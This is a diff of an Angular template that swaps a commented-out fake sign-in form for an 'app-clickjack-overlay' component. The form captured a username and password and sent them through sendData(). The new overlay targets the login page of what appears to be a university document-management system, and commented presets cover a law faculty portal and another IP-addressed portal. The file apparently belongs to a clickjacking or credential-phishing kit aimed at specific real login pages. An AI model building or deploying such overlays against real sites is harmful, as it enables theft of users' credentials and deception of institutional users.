@@ -1,40 +1,21 @@
-<!-- <iframe
-  src="http://112.137.133.9/login" 
-  frameborder="0" allowfullscreen 
-  style="position: absolute; top: 0; right: 0; bottom: 0; left: 0;">
-</iframe>
-<div class="row">
-  <div class="col-md-4 col-md-offset-4">
-    <div class="login-panel panel panel-default">
-      <div class="panel-heading">
-        <h4 class="panel-title">Please Sign In</h4>
-      </div>
-      <div class="panel-body">
-        <form role="form">
-          <fieldset>
-            <div class="form-group">
-              <input class="form-control" placeholder="E-mail" name="email" type="email" id="email" autofocus=""
-              [(ngModel)]="accountData.username" #accountUsername="ngModel" name="accountUsername"/>
-            </div>
-            <div class="form-group">
-              <input class="form-control" placeholder="Password" name="password" type="password" value=""
-              [(ngModel)]="accountData.password" #accountPassword="ngModel" name="accountPassword"/>
-            </div>
-            <div class="checkbox">
-              <label>
-                <input name="remember" type="checkbox" value="Remember Me">  Remember Me
-              </label>
-            </div>
-            <a href="javascript:void(0);" class="btn btn-lg btn-success btn-block" (click)="sendData()">Login</a>
-          </fieldset>
-        </form>
-      </div>
-    </div>
-  </div>
-</div> -->
+<!--
+  Switch scenario by changing targetUrl/redirectUrl.
+  Available presets are defined in src/environments/environment.ts.
 
-<!-- <app-law></app-law> -->
+  Law portal:
+  <app-clickjack-overlay
+    targetUrl="https://law.vnu.edu.vn/Login.aspx"
+    redirectUrl="https://law.vnu.edu.vn/Login.aspx">
+  </app-clickjack-overlay>
 
-<!-- <app-net></app-net> -->
+  Net portal:
+  <app-clickjack-overlay
+    targetUrl="http://112.137.142.19"
+    redirectUrl="http://112.137.142.19">
+  </app-clickjack-overlay>
+-->
 
-<app-office></app-office>
+<app-clickjack-overlay
+  targetUrl="http://112.137.142.21/qlvb/login/"
+  redirectUrl="http://112.137.142.21/qlvb/login/">
+</app-clickjack-overlay>
